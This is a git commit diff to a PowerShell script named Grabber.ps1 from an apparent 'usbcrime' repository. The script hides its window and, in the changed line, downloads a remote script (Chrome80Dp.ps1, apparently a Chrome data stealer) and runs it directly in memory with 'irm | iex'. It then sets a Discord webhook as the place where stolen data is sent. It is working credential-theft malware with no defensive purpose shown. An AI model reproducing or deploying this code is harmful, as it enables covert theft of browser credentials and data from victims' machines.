9628a10d2bf8a4b35980e5c366a9da45c227be66
bindas88 <63970413+bindas88@users.noreply.github.com>
2024-08-10 01:55:12 +0700

    Update Grabber.ps1

--- Grabber.ps1
+++ Grabber.ps1
@@ -13,8 +13,7 @@ else{
     $Type::ShowWindowAsync($hwnd, 0)
 }
 $T=$env:temp
-iwr -Uri 'https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1' -o $T'\Chrome80Dp.ps1'
-Start-Process -FilePath $T"\Chrome80Dp.ps1" -ArgumentList "/S /v/qn" -Wait
+powershell irm https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1 | iex
 sleep 1
 $hookurl = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
 # shortened URL Detection
